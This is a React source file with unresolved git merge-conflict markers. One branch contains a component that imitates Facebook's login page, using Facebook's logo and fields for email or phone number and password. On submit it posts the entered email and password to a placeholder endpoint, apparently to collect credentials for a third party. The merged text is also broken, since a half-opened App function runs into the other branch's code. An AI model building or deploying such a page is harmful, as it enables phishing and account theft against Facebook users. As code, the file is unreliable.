<<<<<<< HEAD
import React from 'react';
import { Route, Navigate, useNavigate, Routes } from "react-router-dom";
import ConnectFaceBook from './components/auth/connect-facebook';
function App() {
=======
import React, { useState } from "react";
import "./App.css";

const FacebookLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (event) => {
    event.preventDefault();
    try {
      await fetch("<API_ENDPOINT>", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ email, password }),
      });
    } catch (error) {
      console.error(error);
    }
  };

>>>>>>> 2c2ce4a9c662bd568b2116be30b7b0e60310c1f8
  return (
    <div className="container">
      <form onSubmit={handleSubmit} className="form">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" alt=""
          className="logo"
        />
        <input
          type="email"
          placeholder="Email or Phone Number"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          className="input"
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          className="input"
        />
        <button type="submit" className="button">
          Log In
        </button>
      </form>
    </div>
  );
};

export default FacebookLogin;
